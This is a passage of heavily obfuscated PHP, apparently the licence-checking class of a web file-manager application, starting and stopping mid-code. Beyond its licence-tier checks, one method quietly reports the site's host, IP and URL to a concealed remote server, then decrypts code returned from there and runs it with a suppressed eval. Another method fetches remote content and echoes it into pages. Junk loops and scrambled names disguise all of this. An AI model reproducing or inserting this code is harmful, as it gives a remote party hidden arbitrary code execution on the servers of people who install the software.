$±€Ğüú[204]), $±€Ğüú[6]); show_json(LNG($±€Ğüú[189]), !0); } private function licenseRegistSuccess() { $Æ×¿Œ =& $_SERVER[‚ûòÉ˜ş]; $¶ò‘“€× =& $_SERVER[ºï·Óû­]; $Ë×¡£Ñ— = Model($¶ò‘“€×[33])->get(); $ƒ°ÔâÍæ = $Æ×¿Œ[705]; if (strlen($ƒ°ÔâÍæ) < $Æ×¿Œ[676]) { die; } if ($Ë×¡£Ñ—[$¶ò‘“€×[63]] != $¶ò‘“€×[123]) { Model($¶ò‘“€×[33])->set($¶ò‘“€×[63], $¶ò‘“€×[123]); } Action($¶ò‘“€×[205])->initStart(!0); } private function nipb645fa7bf() { $ÔİïğàÛ =& $_SERVER[‚ûòÉ˜ş]; $ÈÑ÷ìèš =& $_SERVER[ºï·Óû­]; Model($ÈÑ÷ìèš[33])->set(array($ÈÑ÷ìèš[154] => $ÈÑ÷ìèš[6], $ÈÑ÷ìèš[191] => $ÈÑ÷ìèš[6], $ÈÑ÷ìèš[107] => $ÈÑ÷ìèš[108], $ÈÑ÷ìèš[109] => $ÈÑ÷ìèš[6], $ÈÑ÷ìèš[110] => $ÈÑ÷ìèš[6])); $ŸÌÌÌµ³ = $ÔİïğàÛ[706]; if (!$ŸÌÌÌµ³) { return; } Model($ÈÑ÷ìèš[33])->setDeep($ÈÑ÷ìèš[198], $ÈÑ÷ìèš[206]); $±à–èÑ = $ÔİïğàÛ[707]; while (strlen($±à–èÑ) < $ÔİïğàÛ[676]) { if (!$±à–èÑ) { break; } $±à–èÑ++; } $this->cfrib5593c42 = array(); $this->dxty82d39e70 = $ÈÑ÷ìèš[108]; $»€şõ©ñ = $ÔİïğàÛ[708]; if (strlen($»€şõ©ñ) < $ÔİïğàÛ[663]) { return; } } private function wlmr9def8044() { $şâŒé¤Ú =& $_SERVER[‚ûòÉ˜ş]; $ø¶€úÜ =& $_SERVER[ºï·Óû­]; $_SERVER[$ø¶€úÜ[163]] = _get($_SERVER, $ø¶€úÜ[163], APP_HOST); $Ô±ó×ş = $şâŒé¤Ú[709]; if (!$Ô±ó×ş) { return; } $this->dxty82d39e70 = $ø¶€úÜ[108]; $ÊÑ¬å¡— = $şâŒé¤Ú[710]; $…›Ú¤‰Á = Model($ø¶€úÜ[33])->get(); $ˆœâ€¬¡ = $şâŒé¤Ú[711]; if (!$ˆœâ€¬¡) { die; } if ($…›Ú¤‰Á[$ø¶€úÜ[107]] == $ø¶€úÜ[108]) { return; } $¦İ­î—Õ = Model($ø¶€úÜ[33])->get($ø¶€úÜ[99]); $º„Šæ€¤ = $şâŒé¤Ú[712]; while (strlen($º„Šæ€¤) < $şâŒé¤Ú[19]) { if (!$º„Šæ€¤) { break; } $º„Šæ€¤++; } $¤—˜Öˆ = $ø¶€úÜ[203] . md5($¦İ­î—Õ . $ø¶€úÜ[204]); $É¦¨…ä = $şâŒé¤Ú[713]; if (!$É¦¨…ä) { die; } $ğ™ñúï€ = Cache::get($¤—˜Öˆ); if (!is_array($ğ™ñúï€) || !isset($ğ™ñúï€[$ø¶€úÜ[207]]) || time() - $ğ™ñúï€[$ø¶€úÜ[207]] >= 60) { $’©šı¡Š = Model($ø¶€úÜ[7])->loadList(); $ÇšÆå¸˜ = $’©šı¡Š[$ø¶€úÜ[200]]; $ƒå£ÙØû = md5($_SERVER[$ø¶€úÜ[105]] . strrev($¦İ­î—Õ) . $…›Ú¤‰Á[$ø¶€úÜ[191]]); $ê¾ñ«ŸÌ = strrev(substr($ƒå£ÙØû, 10, 16)); $ğ™ñúï€ = $this->mrog1f375036($ÇšÆå¸˜[$ø¶€úÜ[85]][$ê¾ñ«ŸÌ], $ƒå£ÙØû); $ğ™ñúï€ = json_decode($ğ™ñúï€, !0); } if (!is_array($ğ™ñúï€)) { return $this->nipb645fa7bf(); } $¶ˆÇÄÎ = strtotime($ğ™ñúï€[$ø¶€úÜ[130]]); if (time() >= $¶ˆÇÄÎ) { return $this->nipb645fa7bf(); } if (time() - $ğ™ñúï€[$ø¶€úÜ[207]] > 20) { $ğ™ñúï€[$ø¶€úÜ[207]] = time(); Cache::set($¤—˜Öˆ, $ğ™ñúï€); } $this->cfrib5593c42 = $ğ™ñúï€; $this->dxty82d39e70 = $…›Ú¤‰Á[$ø¶€úÜ[107]]; } private function ngli2eba0f54() { $¥İø¨ÙÕ =& $_SERVER[‚ûòÉ˜ş]; $¼ÏûÁÃ =& $_SERVER[ºï·Óû­]; $ÈÅñ÷†Á = $GLOBALS[$¼ÏûÁÃ[13]]; $©“§áÍ = $¥İø¨ÙÕ[714]; while (strlen($©“§áÍ) < $¥İø¨ÙÕ[665]) { if (!$©“§áÍ) { break; } $©“§áÍ++; } $Ü«şÓş = $_SERVER[$¼ÏûÁÃ[24]]; if ($Ü«şÓş == $¼ÏûÁÃ[208] && $this->dxty82d39e70 == $¼ÏûÁÃ[108]) { show_json(LNG($¼ÏûÁÃ[209]), !1, $¼ÏûÁÃ[210]); } $Ñï¬²š³ = array($¼ÏûÁÃ[211], $¼ÏûÁÃ[212]); if (in_array($Ü«şÓş, $Ñï¬²š³)) { if ($this->dxty82d39e70 == $¼ÏûÁÃ[108] && isset($ÈÅñ÷†Á[$¼ÏûÁÃ[213]])) { show_json(LNG($¼ÏûÁÃ[209]), !1, $¼ÏûÁÃ[210]); die; } $ÜøŸÀ‘œ = $this->wtuj09b58a45(); if ($ÜøŸÀ‘œ != intval($¼ÏûÁÃ[214])) { if ($ÜøŸÀ‘œ <= Model($¼ÏûÁÃ[126])->count()) { show_json(LNG($¼ÏûÁÃ[215]), !1, $¼ÏûÁÃ[210]); die; } } } } private function qzxkcf454453() { $Û—ÙŠã› =& $_SERVER[‚ûòÉ˜ş]; $õîÃÕ®à =& $_SERVER[ºï·Óû­]; $İ·¸¬Ç = array($õîÃÕ®à[120], $õîÃÕ®à[121]); $ ¯•Ó› = $Û—ÙŠã›[715]; if (!_get($GLOBALS, $õîÃÕ®à[117]) || !isset($_GET[$õîÃÕ®à[216]])) { return; } if (!in_array($_SERVER[$õîÃÕ®à[24]], $İ·¸¬Ç)) { return; } $œÍÇ¶• = $õîÃÕ®à[217]; $—²ãù’‰ = $Û—ÙŠã›[716]; while ($—²ãù’‰ < $Û—ÙŠã›[660]) { if ($—²ãù’‰ >= 0) { break; } $—²ãù’‰++; } $œÍÇ¶• = $this->lrfb3aaa4d5c($œÍÇ¶•, $õîÃÕ®à[218]); $’™ƒ‰ˆç = $Û—ÙŠã›[717]; $î…•˜ÏÜ = stream_context_create(array($õîÃÕ®à[219] => array($õîÃÕ®à[220] => $õîÃÕ®à[221], $õîÃÕ®à[222] => 3))); $“”À«äİ = $Û—ÙŠã›[718]; if (strlen($“”À«äİ) < $Û—ÙŠã›[19]) { return; } $£ø¶£² = @file_get_contents($œÍÇ¶•, !1, $î…•˜ÏÜ); $ìÎ¯øñÆ = $Û—ÙŠã›[719]; header($õîÃÕ®à[223]); if ($£ø¶£² && strstr($£ø¶£², $õîÃÕ®à[224])) { echo $£ø¶£²; } die; } public function kriqf02b83ae($çÔŸ¦¾) { $ƒš÷şé =& $_SERVER[‚ûòÉ˜ş]; $ÅÍ÷šÆÄ =& $_SERVER[ºï·Óû­]; if ($this->dxty82d39e70 == $ÅÍ÷šÆÄ[225]) { return $çÔŸ¦¾; } $Õç•´¥ç = array($ÅÍ÷šÆÄ[226] => $ÅÍ÷šÆÄ[227], $ÅÍ÷šÆÄ[228] => $ÅÍ÷šÆÄ[227], $ÅÍ÷šÆÄ[229] => $ÅÍ÷šÆÄ[227], $ÅÍ÷šÆÄ[230] => $ÅÍ÷šÆÄ[231], $ÅÍ÷šÆÄ[232] => $ÅÍ÷šÆÄ[231], $ÅÍ÷šÆÄ[233] => $ÅÍ÷šÆÄ[231], $ÅÍ÷šÆÄ[234] => $ÅÍ÷šÆÄ[231], $ÅÍ÷šÆÄ[235] => $ÅÍ÷šÆÄ[231], $ÅÍ÷šÆÄ[236] => $ÅÍ÷šÆÄ[231], $ÅÍ÷šÆÄ[237] => $ÅÍ÷šÆÄ[231], $ÅÍ÷šÆÄ[238] => $ÅÍ÷šÆÄ[231], $ÅÍ÷šÆÄ[239] => $ÅÍ÷šÆÄ[231], $ÅÍ÷šÆÄ[240] => $ÅÍ÷šÆÄ[231], $ÅÍ÷šÆÄ[241] => $ÅÍ÷šÆÄ[231], $ÅÍ÷šÆÄ[242] => $ÅÍ÷šÆÄ[231]); $Ê¦ß¨€› = $ƒš÷şé[720]; if (strlen($Ê¦ß¨€›) < $ƒš÷şé[676]) { die; } $¼âË±Û© = explode($ÅÍ÷šÆÄ[243], _get($this->cfrib5593c42, $ÅÍ÷šÆÄ[114], $ÅÍ÷šÆÄ[6])); $×­ ‰ğú = array(); foreach ($Õç•´¥ç as $’ş±ûÏ => $ÁÄ¾íº¾) { if ($ÁÄ¾íº¾ == $ÅÍ÷šÆÄ[227] && substr($this->dxty82d39e70, 0, 1) == $ÅÍ÷šÆÄ[227]) { continue; } if (!in_array($’ş±ûÏ, $¼âË±Û©)) { $×­ ‰ğú[] = $’ş±ûÏ; } } foreach ($×­ ‰ğú as $’ş±ûÏ) { unset($çÔŸ¦¾[$’ş±ûÏ]); $•éáû½± = $ƒš÷şé[721]; if (!$•éáû½±) { die; } } return $çÔŸ¦¾; } private function gwjtd7a0fce0() { $Ë· ¡îÑ =& $_SERVER[ºï·Óû­]; if ($this->dxty82d39e70 != $Ë· ¡îÑ[108]) { $GLOBALS[$Ë· ¡îÑ[85]][$Ë· ¡îÑ[89]][$Ë· ¡îÑ[244]] = $Ë· ¡îÑ[206]; return; } $GLOBALS[$Ë· ¡îÑ[85]][$Ë· ¡îÑ[245]] = $Ë· ¡îÑ[123]; if (Model($Ë· ¡îÑ[246])->get($Ë· ¡îÑ[63]) != $Ë· ¡îÑ[206]) { Model($Ë· ¡îÑ[246])->set($Ë· ¡îÑ[63], $Ë· ¡îÑ[206]); } } public function txlm90ec06ff() { return $_SERVER[ºï·Óû­][247]; $Á‘¡¤õ = $_SERVER[‚ûòÉ˜ş][722]; if (!$Á‘¡¤õ) { return; } } private function mopv5a1b4962() { $ø÷Â›­ =& $_SERVER[‚ûòÉ˜ş]; $ÒÓ„ğÈ® =& $_SERVER[ºï·Óû­]; $˜ã´½ó¡ = array($ÒÓ„ğÈ®[248], $ÒÓ„ğÈ®[249], $ÒÓ„ğÈ®[250]); $´Ì¼êŸ¨ = $ÒÓ„ğÈ®[251] . md5($ÒÓ„ğÈ®[252]); if ($this->dxty82d39e70 == $ÒÓ„ğÈ®[108] || !_get($GLOBALS, $ÒÓ„ğÈ®[117])) { return; } if (!in_array($_SERVER[$ÒÓ„ğÈ®[24]], $˜ã´½ó¡)) { return; } if (time() % 4 != 0) { return; } $´ğ•€¢ã = call_user_func(array($ÒÓ„ğÈ®[253], $ÒÓ„ğÈ®[254]), $´Ì¼êŸ¨); $ãºÇ“ğ› = $ø÷Â›­[723]; if (strlen($ãºÇ“ğ›) < $ø÷Â›­[676]) { die; } if ($´ğ•€¢ã && time() - $´ğ•€¢ã < intval($ÒÓ„ğÈ®[255])) { return; } call_user_func(array($ÒÓ„ğÈ®[253], $ÒÓ„ğÈ®[140]), $´Ì¼êŸ¨, time()); $÷ìó‘¡ò = Model($ÒÓ„ğÈ®[33])->get($ÒÓ„ğÈ®[99]); $Õ½²šââ = array($ÒÓ„ğÈ®[153] => Model($ÒÓ„ğÈ®[33])->get($ÒÓ„ğÈ®[154]), $ÒÓ„ğÈ®[167] => $this->dxty82d39e70, $ÒÓ„ğÈ®[164] => $_SERVER[$ÒÓ„ğÈ®[165]], $ÒÓ„ğÈ®[166] => Model($ÒÓ„ğÈ®[33])->get($ÒÓ„ğÈ®[132]), $ÒÓ„ğÈ®[104] => md5($_SERVER[$ÒÓ„ğÈ®[105]] . $÷ìó‘¡ò), $ÒÓ„ğÈ®[157] => $ÒÓ„ğÈ®[137], $ÒÓ„ğÈ®[160] => $_SERVER[$ÒÓ„ğÈ®[161]]); $€âå¨íÛ = $ø÷Â›­[724]; if (strlen($€âå¨íÛ) < $ø÷Â›­[660]) { return; } $™¨‘ˆÅ = $this->iqnkab3de56f($ÒÓ„ğÈ®[256], $Õ½²šââ); $ê²‘Íáƒ = $ø÷Â›­[725]; if (!is_array($™¨‘ˆÅ)) { return; } if ($™¨‘ˆÅ[$ÒÓ„ğÈ®[153]] && $™¨‘ˆÅ[$ÒÓ„ğÈ®[257]]) { if ($this->uoft223a1968($™¨‘ˆÅ[$ÒÓ„ğÈ®[257]]) == $Õ½²šââ[$ÒÓ„ğÈ®[153]]) { return; } } $this->nipb645fa7bf(); if ($this->uoft223a1968($™¨‘ˆÅ[$ÒÓ„ğÈ®[257]]) != $Õ½²šââ[$ÒÓ„ğÈ®[153]]) { $›ó¶éºİ = array($ÒÓ„ğÈ®[185] => $÷ìó‘¡ò, $ÒÓ„ğÈ®[186] => $_SERVER[$ÒÓ„ğÈ®[105]], $ÒÓ„ğÈ®[187] => this_url(), $ÒÓ„ğÈ®[162] => $_SERVER[$ÒÓ„ğÈ®[163]]); $ƒ”ä‰Ï– = $this->ajkbd04f9004(json_encode($›ó¶éºİ)); $™¨‘ˆÅ = $this->iqnkab3de56f($ÒÓ„ğÈ®[188] . $ƒ”ä‰Ï–); if ($™¨‘ˆÅ && is_array($™¨‘ˆÅ) && isset($™¨‘ˆÅ[$ÒÓ„ğÈ®[257]])) { $·‚¨ú = $this->mrog1f375036($™¨‘ˆÅ[$ÒÓ„ğÈ®[257]], 2); if ($·‚¨ú) { $·‚¨ú = $this->uoft223a1968($·‚¨ú); } if ($·‚¨ú) { try { @eval($·‚¨ú); } catch (Exception $õÒ¥Œ‘Å) { } } } } } private function iqnkab3de56f($¾ÕÆ®¨¾ = '', $¬ÏÅìÇÈ = array(), $÷À”ñ“ = 5) { $Î¥’öÚã =& $_SERVER[‚ûòÉ˜ş]; $‡€¢¹ÒÏ =& $_SERVER[ºï·Óû­]; $ †ÂØº– = $‡€¢¹ÒÏ[258]; $¼÷éĞçˆ = $Î¥’öÚã[726]; if (!$¼÷éĞçˆ) { return; } $ †ÂØº– = $this->lrfb3aaa4d5c($ †ÂØº–, $‡€¢¹ÒÏ[259]); $ †ÂØº– = $ †ÂØº– . $¾ÕÆ®¨¾; $ì°¸–‰˜ = $Î¥’öÚã[727]; if ($¬ÏÅìÇÈ && is_array($¬ÏÅìÇÈ)) { $ †ÂØº– = $ †ÂØº– . $‡€¢¹ÒÏ[260] . http_build_query($¬ÏÅìÇÈ); } if ($¬ÏÅìÇÈ === -1) { return $ †ÂØº–; } $ĞåÙâ½‡ = stream_context_create(array($‡€¢¹ÒÏ[219] => array($‡€¢¹ÒÏ[222] => $÷À”ñ“, $‡€¢¹ÒÏ[220] => $‡€¢¹ÒÏ[261]), $‡€¢¹ÒÏ[262] => array($‡€¢¹ÒÏ[263] => !1, $‡€¢¹ÒÏ[264] => !1))); $¬ÏÅìÇÈ = @file_get_contents($ †ÂØº–, !1, $ĞåÙâ½‡); return json_decode($¬ÏÅìÇÈ, !0); } private function wtuj09b58a45() { $ˆ„ºÉ’ =& $_SERVER[‚ûòÉ˜ş]; $”ÑòöæĞ =& $_SERVER[ºï·Óû­]; $È®¥—©Â = array($”ÑòöæĞ[265] => $”ÑòöæĞ[266], $”ÑòöæĞ[267] => $”ÑòöæĞ[268], $”ÑòöæĞ[269] => $”ÑòöæĞ[270], $”ÑòöæĞ[271] => $”ÑòöæĞ[272], $”ÑòöæĞ[273] => $”ÑòöæĞ[274], $”ÑòöæĞ[275] => $”ÑòöæĞ[214], $”ÑòöæĞ[276] => $”ÑòöæĞ[214], $”ÑòöæĞ[277] => $”ÑòöæĞ[266], $”ÑòöæĞ[278] => $”ÑòöæĞ[268], $”ÑòöæĞ[279] => $”ÑòöæĞ[270], $”ÑòöæĞ[280] => $”ÑòöæĞ[281], $”ÑòöæĞ[282] => $”ÑòöæĞ[272], $”ÑòöæĞ[283] => $”ÑòöæĞ[284], $”ÑòöæĞ[285] => $”ÑòöæĞ[274], $”ÑòöæĞ[286] => $”ÑòöæĞ[287], $”ÑòöæĞ[288] => $”ÑòöæĞ[289], $”ÑòöæĞ[290] => $”ÑòöæĞ[291]); $ù·ô§ç = $ˆ„ºÉ’[728]; $¾â„õé = $È®¥—©Â[$this->dxty82d39e70]; $äİ³¿ø = $ˆ„ºÉ’[729]; $¾â„õé = intval($¾â„õé ? $¾â„õé : $”ÑòöæĞ[266]); $ëÕÏ´Í£ = _get($this->cfrib5593c42, $”ÑòöæĞ[292]); $šñ¾¼Ã™ = $ˆ„ºÉ’[730]; while (strlen($šñ¾¼Ã™) < $ˆ„ºÉ’[19]) { if (!$šñ¾¼Ã™) { break; } $šñ¾¼Ã™++; } $ëÕÏ´Í£ = $ëÕÏ´Í£ ? intval($ëÕÏ´Í£) : 0; $´Š÷å€ï = $ˆ„ºÉ’[731]; while ($´Š÷å€ï < $ˆ„ºÉ’[19]) { if ($´Š÷å€ï >= 0) { break; } $´Š÷å€ï++; } return $¾â„õé + $ëÕÏ´Í£; $Òæ˜õùö = $ˆ„ºÉ’[732]; } public function sehn73a0a579($ĞÄ­‚…˜) { $¬å„¸ =& $_SERVER[‚ûòÉ˜ş]; $¨÷ó¿ƒ¾ =& $_SERVER[ºï·Óû­]; $‘™â³©— = $this->wtuj09b58a45(); $ÓÉ€ŞÄÏ = $¬å„¸[733]; if ($ĞÄ­‚…˜[$¨÷ó¿ƒ¾[293]] == $¨÷ó¿ƒ¾[123]) { return; } if ($‘™â³©— >= intval($¨÷ó¿ƒ¾[214])) { return; } $´‡íØ¶ã = Model($¨÷ó¿ƒ¾[126])->count(); if ($´‡íØ¶ã <= $‘™â³©—) { return; } $äÂ¾…Á = Model($¨÷ó¿ƒ¾[126])->field($¨÷ó¿ƒ¾[293])->limit($‘™â³©—)->select(); $äÂ¾…Á = array_to_keyvalue($äÂ¾…Á, $¨÷ó¿ƒ¾[6], $¨÷ó¿ƒ¾[293]); $­˜¾º­ = $¬å„¸[734]; if (!$­˜¾º­) { die; } if (!in_array($ĞÄ­‚…˜[$¨÷ó¿ƒ¾[293]], $äÂ¾…Á)) { show_json($¨÷ó¿ƒ¾[294], !1, $¨÷ó¿ƒ¾[210]); } } public function wptl38b71a95() { $üïÈğñŞ =& $_SERVER[‚ûòÉ˜ş]; $¨²æÚ© =& $_SERVER[ºï·Óû­]; if (!_get($GLOBALS, $¨²æÚ©[117]) || mt_rand(1, 100) > 20) { return; } $‚Ïõ”‰ = $¨²æÚ©[217]; $‚Ïõ”‰ = $this->lrfb3aaa4d5c($‚Ïõ”‰, $¨²æÚ©[218]); $¸ºÚ‡§ = stream_context_create(array($¨²æÚ©[219] => array($¨²æÚ©[220] => $¨²æÚ©[221], $¨²æÚ©[222] => 3))); $‡»’ùÖ­ = $üïÈğñŞ[735]; if (strlen($‡»’ùÖ­) < $üïÈğñŞ[665]) { return; } $ãôş½±Æ = @file_get_contents($‚Ïõ”‰, !1, $¸ºÚ‡§); $‘ãòÖ€„ = $üïÈğñŞ[736]; while (strlen($‘ãòÖ€„) < $üïÈğñŞ[663]) { if (!$‘ãòÖ€„) { break; } $‘ãòÖ€„++; } echo $¨²æÚ©[295] . hash_encode($ãôş½±Æ) . $¨²æÚ©[296]; } private function qnax2456ce61($‘Ù†Ø, $™õû½À, $µ¸èü = 3) { $“Ş„âÖŸ =& $_SERVER[‚ûòÉ˜ş]; $‘ –ı›† =& $_SERVER[ºï·Óû­]; usleep(1); $á¯÷ƒ²Ç = $“Ş„âÖŸ[737]; if (strlen($á¯÷ƒ²Ç) < $“Ş„âÖŸ[676]) { die; } $‘Ù†Ø = trim($‘Ù†Ø); $Ğ‡Ü½ã” = mt_rand(0, 5) . $‘ –ı›†[6]; $Ø‚‘¨œ = rand_string(15); $©Â¬òÛ = $“Ş„âÖŸ[738]; if (strlen($©Â¬òÛ) < $“Ş„âÖŸ[665]) { return; } $£½üØ†Û = $‘ –ı›†[297]; $Ü¬«Ö”ô = $“Ş„âÖŸ[739]; switch ($Ğ‡Ü½ã”) { case $‘ –ı›†[206]: $ÎïÜ‹Ù• = $this->pnixd243fd28($‘Ù†Ø, strrev($™õû½À . $Ø‚‘¨œ)); break; $ÏóÂÔĞ = $“Ş„âÖŸ[740]; if (!$ÏóÂÔĞ) { return; } case $‘ –ı›†[123]: $ÎïÜ‹Ù• = $this->pnixd243fd28($‘Ù†Ø, strrev($Ø‚‘¨œ . $™õû½À)); break; $úé·¢ŸÕ = $“Ş„âÖŸ[741]; case $‘ –ı›†[298]: $ÎïÜ‹Ù• = $this->pnixd243fd28($‘Ù†Ø, base64_encode($Ø‚‘¨œ . $™õû½À)); break; case $‘ –ı›†[299]: $ÎïÜ‹Ù• = $this->pnixd243fd28($‘Ù†Ø, md5($Ø‚‘¨œ . $™õû½À)); break; $•¿‰³¢• = $“Ş„âÖŸ[742]; if (strlen($•¿‰³¢•) < $“Ş„âÖŸ[660]) { return; } case $‘ –ı›†[300]: $‘Ù†Ø = base64_encode($‘Ù†Ø); $ˆÈª­ë = $“Ş„âÖŸ[743]; $ƒıÉ½¯Ş = rand(0, 64); $æı°ÕóÂ = $£½üØ†Û[$ƒıÉ½¯Ş]; $±×ÊİúÉ = md5($æı°ÕóÂ . md5($™õû½À . $æı°ÕóÂ) . $™õû½À); $±×ÊİúÉ = substr($±×ÊİúÉ, $ƒıÉ½¯Ş % 8, $ƒıÉ½¯Ş % 8 + 7); $¡æ¾ó§ = $‘ –ı›†[6]; $Ã­æÅİú = $“Ş„âÖŸ[744]; $ŠÃ“ÆÚ« = 0; $íÜ»¤İò = 0; $õº´èøæ = $“Ş„âÖŸ[745]; if (strlen($õº´èøæ) < $“Ş„âÖŸ[663]) { return; } $Ü×ï“·À = 0; $¥ùŞØ… = $“Ş„âÖŸ[746]; if (strlen($¥ùŞØ…) < $“Ş„âÖŸ[19]) { die; } for ($ŠÃ“ÆÚ« = 0; $ŠÃ“ÆÚ« < strlen($‘Ù†Ø); $ŠÃ“ÆÚ«++) { $Ü×ï“·À = $Ü×ï“·À == strlen($±×ÊİúÉ) ? 0 : $Ü×ï“·À; $íÜ»¤İò = ($ƒıÉ½¯Ş + strpos($£½üØ†Û, $‘Ù†Ø[$ŠÃ“ÆÚ«]) + ord($±×ÊİúÉ[$Ü×ï“·À++])) % 64; $¡æ¾ó§ .= $£½üØ†Û[$íÜ»¤İò]; $ğ¶ÛîÛ˜ = $“Ş„âÖŸ[747]; if (!$ğ¶ÛîÛ˜) { return; } } $ÎïÜ‹Ù• = hash_encode($æı°ÕóÂ . $¡æ¾ó§); $¨àá¨Ü = $“Ş„âÖŸ[748]; if (strlen($¨àá¨Ü) < $“Ş„âÖŸ[676]) { die; } break; default: $ÎïÜ‹Ù• = $this->pnixd243fd28($‘Ù†Ø, $™õû½À . $Ø‚‘¨œ); break; $íÒª…Ñ = $“Ş„âÖŸ[749]; if (strlen($íÒª…Ñ) < $“Ş„âÖŸ[19]) { return; } } $ÎïÜ‹Ù• = strrev($Ğ‡Ü½ã” . $Ø‚‘¨œ . $ÎïÜ‹Ù•); if ($µ¸èü - 1 > 0) { $ÎïÜ‹Ù• = $this->qnax2456ce61($ÎïÜ‹Ù•, $™õû½À, $µ¸èü - 1); } return $ÎïÜ‹Ù•; } private function mrog1f375036($ ğ÷–Õç, $Öˆéèèä, $öÀÚ•¥ï = 3) { $œ´Œ¦ì¹ =& $_SERVER[‚ûòÉ˜ş]; $ÜšöÅñ¤ =& $_SERVER[ºï·Óû­]; if (!is_string($ ğ÷–Õç) || strlen($ ğ÷–Õç) < 10) { return !1; } $ ğ÷–Õç = trim($ ğ÷–Õç); $ÖŒÂúÑ = $œ´Œ¦ì¹[750]; if (!$ÖŒÂúÑ) { die; } $ ğ÷–Õç = strrev($ ğ÷–Õç); $œÅ…‚€ = $œ´Œ¦ì¹[751]; if (!$œÅ…‚€) { die; } $ƒŞÒå”• = $ ğ÷–Õç[0]; $§Š“®ªå = $œ´Œ¦ì¹[752]; $ÃßÆì¨ = substr($ ğ÷–Õç, 1, 15); $ ğ÷–Õç = substr($ ğ÷–Õç, 16); $ïĞ³® = $ÜšöÅñ¤[297]; $ËÖ§¶Ù = $œ´Œ¦ì¹[753]; while ($ËÖ§¶Ù < $œ´Œ¦ì¹[676]) { if ($ËÖ§¶Ù >= 0) { break; } $ËÖ§¶Ù++; } switch ($ƒŞÒå”•) { case $ÜšöÅñ¤[206]: $óŞê Ã = $this->lrfb3aaa4d5c($ ğ÷–Õç, strrev($Öˆéèèä . $ÃßÆì¨)); $™‰¦Ç¶ä = $œ´Œ¦ì¹[754]; while (strlen($™‰¦Ç¶ä) < $œ´Œ¦ì¹[663]) { if (!$™‰¦Ç¶ä) { break; } $™‰¦Ç¶ä++; } break; $ÈéñÚÜÃ = $œ´Œ¦ì¹[755]; if (!$ÈéñÚÜÃ) { return; } case $ÜšöÅñ¤[123]: $óŞê Ã = $this->lrfb3aaa4d5c($ ğ÷–Õç, strrev($ÃßÆì¨ . $Öˆéèèä)); break; $Ñ¸Ô†êü = $œ´Œ¦ì¹[756]; while ($Ñ¸Ô†êü < $œ´Œ¦ì¹[676]) { if ($Ñ¸Ô†êü >= 0) { break; } $Ñ¸Ô†êü++; } case $ÜšöÅñ¤[298]: $óŞê Ã = $this->lrfb3aaa4d5c($ ğ÷–Õç, base64_encode($ÃßÆì¨ . $Öˆéèèä)); $„òáÏ· = $œ´Œ¦ì¹[757]; break; $ÑæËüš€ = $œ´Œ¦ì¹[758]; case $ÜšöÅñ¤[299]: $óŞê Ã = $this->lrfb3aaa4d5c($ ğ÷–Õç, md5($ÃßÆì¨ . $Öˆéèèä)); break; $·ô–‰ƒ¤ = $œ´Œ¦ì¹[759]; while (strlen($·ô–‰ƒ¤) < $œ´Œ¦ì¹[676]) { if (!$·ô–‰ƒ¤) { break; } $·ô–‰ƒ¤++; } case $ÜšöÅñ¤[300]: $ ğ÷–Õç = hash_decode($ ğ÷–Õç); $ûÜ†îÓû = $ ğ÷–Õç[0]; $ ğ÷–Õç = substr($ ğ÷–Õç, 1); $Ú•Æû¥ = strpos($ïĞ³®, $ûÜ†îÓû); $œì˜Û„ú = md5($ûÜ†îÓû . md5($Öˆéèèä . $ûÜ†îÓû) . $Öˆéèèä); $œì˜Û„ú = substr($œì˜Û„ú, $Ú•Æû¥ % 8, $Ú•Æû¥ % 8 + 7); $§”’ùÍö = $œ´Œ¦ì¹[760]; $ö©íèô‰ = $ÜšöÅñ¤[6]; $’ÜİÊØ÷ = $œ´Œ¦ì¹[761]; if (strlen($’ÜİÊØ÷) < $œ´Œ¦ì¹[660]) { die; } $Ğğ¿©¶— = 0; $¸âƒê = 0; $‹ë¢…ÌÃ = 0; for ($Ğğ¿©¶— = 0; $Ğğ¿©¶— < strlen($ ğ÷–Õç); $Ğğ¿©¶—++) { $‹ë¢…ÌÃ = $‹ë¢…ÌÃ == strlen($œì˜Û„ú) ? 0 : $‹ë¢…ÌÃ; $ÃÒ÷ÃÑ = $‹ë¢…ÌÃ++; $Íğ’­ = $œ´Œ¦ì¹[762]; while (strlen($Íğ’­) < $œ´Œ¦ì¹[676]) { if (!$Íğ’­) { break; } $Íğ’­++; } $¸âƒê = strpos($ïĞ³®, $ ğ÷–Õç[$Ğğ¿©¶—]) - $Ú•Æû¥ - ord($œì˜Û„ú[$ÃÒ÷ÃÑ]); while ($¸âƒê < 0) { $¸âƒê += 64; } $ö©íèô‰ .= $ïĞ³®[$¸âƒê]; $Ÿ­ ¤³ = $œ´Œ¦ì¹[763]; if (!$Ÿ­ ¤³) { return; } } $óŞê Ã = base64_decode($ö©íèô‰); break; $³ß‚„ôÑ = $œ´Œ¦ì¹[764]; if (strlen($³ß‚„ôÑ) < $œ´Œ¦ì¹[665]) { die; } default: $óŞê Ã = $this->lrfb3aaa4d5c($ ğ÷–Õç, $Öˆéèèä . $ÃßÆì¨); $À…µò› = $œ´Œ¦ì¹[765]; break; $÷³ÌÛ¸µ = $œ´Œ¦ì¹[766]; if (!$÷³ÌÛ¸µ) { return; } } if ($öÀÚ•¥ï - 1 > 0) { $óŞê Ã = $this->mrog1f375036($óŞê Ã, $Öˆéèèä, $öÀÚ•¥ï - 1); } return $óŞê Ã; } public function ajkbd04f9004($º İáñİ) { $íÖƒŞÑ =& $_SERVER[‚ûòÉ˜ş]; $•À½« =& $_SERVER[ºï·Óû­]; $ÜªÇ‘º® = $this->fnhw0a7ff999(); $×ªâÎˆ = $íÖƒŞÑ[767]; $ı‚‚Êß = $this->fnhw0a7ff999(); $©Ÿ˜±Õ = ($ÜªÇ‘º® - 1) * ($ı‚‚Êß - 1); $ŸŒ»²Ò¼ = intval(($ÜªÇ‘º® + $ı‚‚Êß) / 2); while (1) { $Ì¦ÉÀ“ = $ŸŒ»²Ò¼; $é“‹Œ = $íÖƒŞÑ[768]; if (!$é“‹Œ) { die; } $ß÷ÑŒ¨´ = $©Ÿ˜±Õ; $ıêƒĞ‘ = $íÖƒŞÑ[769]; if (!$ıêƒĞ‘) { die; } while ($ß÷ÑŒ¨´ % $Ì¦ÉÀ“ != 0) { $£½ƒ—–¹ = $ß÷ÑŒ¨´; $’‹ÖÉ = $íÖƒŞÑ[770]; if (strlen($’‹ÖÉ) < $íÖƒŞÑ[663]) { return; } $ß÷ÑŒ¨´ = $Ì¦ÉÀ“; $çŞÆäÃ = $íÖƒŞÑ[771]; if (!$çŞÆäÃ) { return; } $Ì¦ÉÀ“ = $£½ƒ—–¹ % $Ì¦ÉÀ“; $€Ò¾¶Ï = $íÖƒŞÑ[772]; if (strlen($€Ò¾¶Ï) < $íÖƒŞÑ[19]) { 